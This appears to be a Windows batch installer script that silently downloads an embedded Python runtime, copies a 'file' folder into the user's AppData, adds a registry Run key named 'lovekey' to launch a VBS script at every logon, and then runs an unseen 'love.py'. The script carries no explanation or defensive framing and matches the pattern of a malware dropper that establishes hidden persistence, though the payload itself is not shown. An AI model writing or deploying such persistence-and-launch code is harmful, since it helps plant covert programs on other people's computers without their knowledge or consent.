IF EXIST C:\Python391\python.exe GOTO pythonInstalled
curl -s "https://www.python.org/ftp/python/3.9.1/python-3.9.1-embed-amd64.zip" --output src\python391.zip
MKDIR src\python391
CD src\python391
"..\..\bin\7z.exe" x "..\python391.zip" * 
CD ..\..
MOVE src\python391 c:\
DEL src\python391.zip
:pythonInstalled
REG query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey
IF %errorlevel%==0 GOTO keyInstalled
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_EXPAND_SZ /d "%SystemRoot%\System32\WScript.exe %appdata%\file\launch.vbs"
:keyInstalled
IF EXIST %appdata%\file GOTO fileCopied
XCOPY src\file %appdata%\file /i
:fileCopied
"C:\Python391\python.exe" "src\file\love.py"